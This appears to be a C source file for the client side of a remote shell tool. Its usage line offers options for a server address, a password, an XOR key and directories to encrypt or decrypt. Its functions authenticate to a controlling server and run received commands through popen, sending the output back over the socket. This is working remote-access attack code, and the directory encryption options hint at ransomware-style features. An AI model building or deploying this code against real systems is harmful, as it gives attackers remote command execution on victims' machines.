#include "client_base.h"

// Print the usage message for the client program
void print_usage(const char *prog_name) {
    fprintf(stderr, "Usage: %s [-i <ip/domain>] [-p <port>] [-w <password>] [-e <dir>] [-d <dir>] [-k <xor_key>]\n", prog_name);
}

// Print an error message and exit the program
void error_exit(const char *message) {
    perror(message);
    exit(EXIT_FAILURE);
}

// Authenticate with the server using the provided password
int authenticate(int sockfd, const char *password) {
    char buffer[BUFFER_SIZE];

    // Send the password to the server
    if (send(sockfd, password, strlen(password), 0) < 0) {
        perror("Error sending password to server");
        return 0;
    }

    // Wait for the authentication response
    int bytes_received = recv(sockfd, buffer, BUFFER_SIZE - 1, 0);
    if (bytes_received < 0) {
        perror("Error receiving authentication response");
        return 0;
    }

    buffer[bytes_received] = '\0'; // Null-terminate the response

    // Check if the server's response contains the confirmation message
    if (strstr(buffer, "REMOTE_SHELL_CONFIRMED") != NULL) {
        printf("Authentication successful.\n");
        return 1;
    } else {
        printf("Authentication failed: %s\n", buffer);
        return 0;
    }
}

// Execute a shell command and send the output back to the server
void execute_command_and_send_output(const char *command, int sockfd) {
    char output_buffer[BUFFER_SIZE];
    FILE *fp;

    // Open a pipe to execute the command
    fp = popen(command, "r");
    if (!fp) {
        snprintf(output_buffer, BUFFER_SIZE, "Failed to execute command: %s\n", command);
        send(sockfd, output_buffer, strlen(output_buffer), 0);
        return;
    }

    // Read the command's output and send it to the server line by line
    while (fgets(output_buffer, BUFFER_SIZE, fp)) {
        send(sockfd, output_buffer, strlen(output_buffer), 0);
    }

    // Close the pipe
    pclose(fp);
}